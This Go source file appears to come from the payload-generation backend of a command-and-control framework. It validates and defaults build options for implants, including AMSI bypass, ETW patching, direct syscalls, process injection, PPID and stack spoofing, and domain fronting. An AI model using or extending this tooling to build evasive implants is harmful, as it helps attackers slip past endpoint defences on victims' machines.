package api

import (
	"fmt"
	"strings"

	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/utils/logx"
)

// genServerBody 是 /client/GenServer 的请求体。
//
// 原来是 GenServer 里的匿名结构体；P4 把 OPSEC 开关做成可批量校验的一组字段，
// 单独提出来才能写"取值合法性 + 平台适配 + 默认值回落"这一整套逻辑而不把
// GenServer 撑得更长。
type genServerBody struct {
	OsType      string `json:"osType"`
	ArchType    string `json:"archType"`
	Listener    string `json:"listener"`
	Pass        string `json:"pass"`
	Vkey        string `json:"vkey"`
	EncryptSalt string `json:"encryptSalt"`
	Format      string `json:"format"`    // exe(默认) | dll（仅 windows 目标，rundll32/regsvr32 加载）
	FrontHost   string `json:"frontHost"` // B8: 域前置/CDN 回源 Host（可选，http/https 客户端）
	// ---- OPSEC 编译期配置（可选；空值 = 回落到服务端 opsec 默认 → 内置默认）----
	ReconnectBaseDelay  string `json:"reconnectBaseDelay"`
	ReconnectMaxRetries string `json:"reconnectMaxRetries"`
	InjectTechDefault   string `json:"injectTech"`
	MasqueradeName      string `json:"masqueradeName"`
	QuietMode           string `json:"quietMode"`
	ETWPatch            string `json:"etwPatch"`
	AmsiBypass          string `json:"amsiBypass"`
	SyscallMode         string `json:"syscallMode"`
	AutoDelete          string `json:"autoDelete"`
	UserAgent           string `json:"userAgent"`
	ProfileName         string `json:"profileName"` // C2 Profile（profiles/*.yaml），空=default
	// P0–P3 对抗能力的细分开关（docs/OPSEC.md §8 开关矩阵）
	SleepMaskHide string `json:"sleepMaskHide"`
	StackSpoof    string `json:"stackSpoof"`
	PpidSpoof     string `json:"ppidSpoof"`
	BlockDLLs     string `json:"blockDLLs"`
	UnhookOnStart string `json:"unhookOnStart"`
	// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
	// 非空时使用 multi 模板：客户端按端点顺序在运行时切换传输。
	Endpoints string `json:"endpoints"`
}

// opsecParams 是校验/回落之后的最终 OPSEC 取值（全部已是 "1"/"0" 或合法枚举）。
type opsecParams struct {
	ETW           string
	AMSI          string
	SyscallMode   string
	AutoDelete    string
	QuietMode     string
	InjectTech    string
	SleepMaskHide string
	StackSpoof    string
	PpidSpoof     string
	BlockDLLs     string
	UnhookOnStart string
}

// normalizeOnOff 把开关类取值收敛成 "1"/"0"（"" = 未提供，交给默认值回落）。
//
// 为什么必须校验：GenServer 原来是把这些字段原样 padRight 写进二进制，
// 而客户端判定是 strings.TrimSpace(v)=="1"。于是 "true"/"yes"/"on" 这类
// "看起来是开"的值会被客户端判成关闭——没有任何运行期症状，操作员只会
// 觉得"开了没用"。宁可在生成阶段报 400。
func normalizeOnOff(field, v string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "":
		return "", nil
	case "1", "true", "on", "yes":
		return "1", nil
	case "0", "false", "off", "no":
		return "0", nil
	}
	return "", fmt.Errorf("%s 取值非法: %q（仅接受 1/0，留空表示跟随服务端默认）", field, v)
}

func normalizeSyscallMode(v string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "":
		return "", nil
	case "none", "direct", "indirect":
		return strings.ToLower(strings.TrimSpace(v)), nil
	}
	return "", fmt.Errorf("syscallMode 取值非法: %q（仅接受 none/direct/indirect）", v)
}

func normalizeInjectTech(v string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "":
		return "", nil
	case "auto", "ntc", "apc", "crt":
		return strings.ToLower(strings.TrimSpace(v)), nil
	}
	return "", fmt.Errorf("injectTech 取值非法: %q（仅接受 auto/ntc/apc/crt）", v)
}

// opsecDefaultsFromConfig 取服务端配置的默认值（config.json 的 opsec 段）。
// 未配置的字段返回空串，由内置默认兜底。
func opsecDefaultsFromConfig() opsecParams {
	var p opsecParams
	g := config.GetGlobalConfig()
	if g == nil {
		return p
	}
	o := g.Opsec
	p.ETW = o.ETWPatch
	p.AMSI = o.AmsiBypass
	p.SyscallMode = o.SyscallMode
	p.AutoDelete = o.AutoDelete
	p.QuietMode = o.QuietMode
	p.InjectTech = o.InjectTech
	p.SleepMaskHide = o.SleepMaskHide
	p.StackSpoof = o.StackSpoof
	p.PpidSpoof = o.PpidSpoof
	p.BlockDLLs = o.BlockDLLs
	p.UnhookOnStart = o.UnhookOnStart
	return p
}

// builtinOpsecDefaults 是"配置也没写"时的最终默认值。
//
// 注意 autoDelete 保持 "1"：与 pkg/delivery 的 defs 以及既有生成行为一致，
// 不在这里改语义（改默认值会让"我没勾它却自删了"变成另一种惊吓）。
func builtinOpsecDefaults() opsecParams {
	return opsecParams{
		ETW:           "0",
		AMSI:          "0",
		SyscallMode:   "none",
		AutoDelete:    "1",
		QuietMode:     "1",
		InjectTech:    "auto",
		SleepMaskHide: "0",
		StackSpoof:    "0",
		PpidSpoof:     "0",
		BlockDLLs:     "0",
		UnhookOnStart: "0",
	}
}

// resolveOpsec 完成三件事：逐字段校验请求值 → 空值按"服务端配置 → 内置默认"回落
// → 按目标平台拒绝不可能的开关组合。
//
// 平台组合一律**报错**而不是静默关掉：静默关掉会让"我勾了却没生效"重现，
// 而这正是这次要修的病根（详见 docs/OPSEC.md §8）。
func resolveOpsec(b *genServerBody, osType, archType string) (opsecParams, error) {
	cfgDef := opsecDefaultsFromConfig()
	builtin := builtinOpsecDefaults()

	pick := func(field, bodyVal, cfgVal, builtinVal string, norm func(string, string) (string, error)) (string, error) {
		v, err := norm(field, bodyVal)
		if err != nil {
			return "", err
		}
		if v != "" {
			return v, nil
		}
		if cfgVal != "" {
			cv, cerr := norm(field, cfgVal)
			if cerr != nil {
				return "", fmt.Errorf("服务端 opsec 配置非法: %v", cerr)
			}
			if cv != "" {
				return cv, nil
			}
		}
		return builtinVal, nil
	}

	var p opsecParams
	var err error
	if p.ETW, err = pick("etwPatch", b.ETWPatch, cfgDef.ETW, builtin.ETW, normalizeOnOff); err != nil {
		return p, err
	}
	if p.AMSI, err = pick("amsiBypass", b.AmsiBypass, cfgDef.AMSI, builtin.AMSI, normalizeOnOff); err != nil {
		return p, err
	}
	if p.SyscallMode, err = pick("syscallMode", b.SyscallMode, cfgDef.SyscallMode, builtin.SyscallMode,
		func(f, v string) (string, error) { return normalizeSyscallMode(v) }); err != nil {
		return p, err
	}
	if p.AutoDelete, err = pick("autoDelete", b.AutoDelete, cfgDef.AutoDelete, builtin.AutoDelete, normalizeOnOff); err != nil {
		return p, err
	}
	if p.QuietMode, err = pick("quietMode", b.QuietMode, cfgDef.QuietMode, builtin.QuietMode, normalizeOnOff); err != nil {
		return p, err
	}
	if p.InjectTech, err = pick("injectTech", b.InjectTechDefault, cfgDef.InjectTech, builtin.InjectTech,
		func(f, v string) (string, error) { return normalizeInjectTech(v) }); err != nil {
		return p, err
	}
	if p.SleepMaskHide, err = pick("sleepMaskHide", b.SleepMaskHide, cfgDef.SleepMaskHide, builtin.SleepMaskHide, normalizeOnOff); err != nil {
		return p, err
	}
	if p.StackSpoof, err = pick("stackSpoof", b.StackSpoof, cfgDef.StackSpoof, builtin.StackSpoof, normalizeOnOff); err != nil {
		return p, err
	}
	if p.PpidSpoof, err = pick("ppidSpoof", b.PpidSpoof, cfgDef.PpidSpoof, builtin.PpidSpoof, normalizeOnOff); err != nil {
		return p, err
	}
	if p.BlockDLLs, err = pick("blockDLLs", b.BlockDLLs, cfgDef.BlockDLLs, builtin.BlockDLLs, normalizeOnOff); err != nil {
		return p, err
	}
	if p.UnhookOnStart, err = pick("unhookOnStart", b.UnhookOnStart, cfgDef.UnhookOnStart, builtin.UnhookOnStart, normalizeOnOff); err != nil {
		return p, err
	}

	if err := checkOpsecPlatform(p, osType, archType); err != nil {
		return p, err
	}
	return p, nil
}

// checkOpsecPlatform 拒绝"目标平台根本没有实现"的开关组合。
// 这些能力只在 windows/amd64 上有实现（linux 模板里连占位符都不存在），
// 勾了只会得到一个写着 1 却什么都不做的载荷。
func checkOpsecPlatform(p opsecParams, osType, archType string) error {
	isWindows := strings.EqualFold(osType, "windows")
	isAmd64 := strings.EqualFold(archType, "amd64")

	if !isWindows {
		var on []string
		for _, f := range []struct {
			name string
			val  string
		}{
			{"etwPatch", p.ETW},
			{"amsiBypass", p.AMSI},
			{"sleepMaskHide", p.SleepMaskHide},
			{"stackSpoof", p.StackSpoof},
			{"ppidSpoof", p.PpidSpoof},
			{"blockDLLs", p.BlockDLLs},
			{"unhookOnStart", p.UnhookOnStart},
		} {
			if f.val == "1" {
				on = append(on, f.name)
			}
		}
		if p.SyscallMode != "none" {
			on = append(on, "syscallMode="+p.SyscallMode)
		}
		if len(on) > 0 {
			return fmt.Errorf("以下开关仅 windows 载荷支持，目标 os=%s 上无法生效: %s", osType, strings.Join(on, ", "))
		}
		return nil
	}

	if !isAmd64 {
		var on []string
		if p.SyscallMode != "none" {
			on = append(on, "syscallMode="+p.SyscallMode)
		}
		for _, f := range []struct {
			name string
			val  string
		}{
			{"sleepMaskHide", p.SleepMaskHide},
			{"stackSpoof", p.StackSpoof},
			{"unhookOnStart", p.UnhookOnStart},
		} {
			if f.val == "1" {
				on = append(on, f.name)
			}
		}
		if len(on) > 0 {
			return fmt.Errorf("以下开关仅 windows/amd64 实现，目标 arch=%s 上无法生效: %s", archType, strings.Join(on, ", "))
		}
	}

	if p.StackSpoof == "1" && p.SyscallMode != "direct" {
		return fmt.Errorf("stackSpoof 仅 syscallMode=direct 时生效（当前 syscallMode=%s）：indirect 靠 ntdll 的 ret 返回，布伪栈会把返回地址暴露在模块外", p.SyscallMode)
	}
	return nil
}

// logOpsecSummary 把最终取值打进日志：出现"开关没生效"时，第一现场证据就在这里。
func logOpsecSummary(p opsecParams, osType, archType string) {
	logx.Debugf("🔐 [SERVER-GEN] OPSEC os=%s arch=%s etw=%s amsi=%s syscall=%s autodelete=%s quiet=%s inject=%s modhide=%s spoof=%s ppid=%s blockdlls=%s unhook=%s\n",
		osType, archType, p.ETW, p.AMSI, p.SyscallMode, p.AutoDelete, p.QuietMode, p.InjectTech,
		p.SleepMaskHide, p.StackSpoof, p.PpidSpoof, p.BlockDLLs, p.UnhookOnStart)
}
